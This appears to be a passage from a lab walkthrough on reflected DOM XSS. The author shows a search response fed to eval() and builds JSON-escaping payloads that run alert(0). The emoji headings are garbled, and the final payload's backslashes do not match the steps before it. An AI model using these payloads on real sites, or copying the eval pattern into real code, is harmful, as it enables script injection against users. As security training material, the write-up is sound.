### 2Ô∏è‚É£ Understanding the Lab Scenario

- The site contains a **search** box.

- When you type any word and click **Search**, the **word is displayed** on the results page.

### 3Ô∏è‚É£ Source Code Analysis

- I looked at the source code and found nothing.
    
- So I opened Burp Suite and sent the request, and this is what appeared:
    

![Pasted image](../images/Pasted%20image%2020250429184917.png)

- But when I looked again, I found there was an **additional response**, and it contained this dangerous code:
    

```js
if (this.readyState == 4 && this.status == 200) {
¬† eval('var searchResultsObj = ' + this.responseText);
¬† displaySearchResults(searchResultsObj);
}
```

- The code takes the response from the server and puts it in the `eval()` function, which treats any input as JavaScript code and executes it.

### 4Ô∏è‚É£ Exploitation Analysis

#### ‚ùó The Problem:

The server response is like this:

```json
{
  "results": [],
  "searchTerm": "z3rob"
}
```

If we put code inside `searchTerm`, it will be treated as a string and not executed as JavaScript.

---

### ‚úÖ Solution: Break the JSON Structure

#### Step 1Ô∏è‚É£: Try to break out of the string

We tried to put:

```
results?search=z3rob"
```

And the response was:

```json
{
  "results": [],
  "searchTerm": "z3rob\""
}
```

- The response added a `\` to prevent breaking the string.
    

##### ‚û§ Solution:

We add a `\` as well, so it becomes:

```
results?search=z3rob\\"
```

The server responds:

```json
{
  "results": [],
  "searchTerm": "z3rob\\\""
}
```

We succeeded in breaking the string sequence.

---

#### Step 2Ô∏è‚É£: Try to break out of the entire JSON and add JavaScript

We tried to put:

```
z3rob\\""}alert(0)//
```

But the code **did not work**.

---

### ‚ùì Question: **Why didn't the code work?**

```js
z3rob\\""}alert(0)//
```

üëÜ This code didn't work because we **forgot to put a semicolon `;`**.

### ‚úÖ Explanation:

- The code inside `eval()` must be syntactically correct.
    
- Without `;`, the browser may concatenate `alert(0)` with the previous statement, causing an error.
    

---

### ‚úîÔ∏è Final Solution (Final Payload)

```js
z3rob\"};alert(0)//
```

‚úÖ The `alert(0)` was executed successfully!
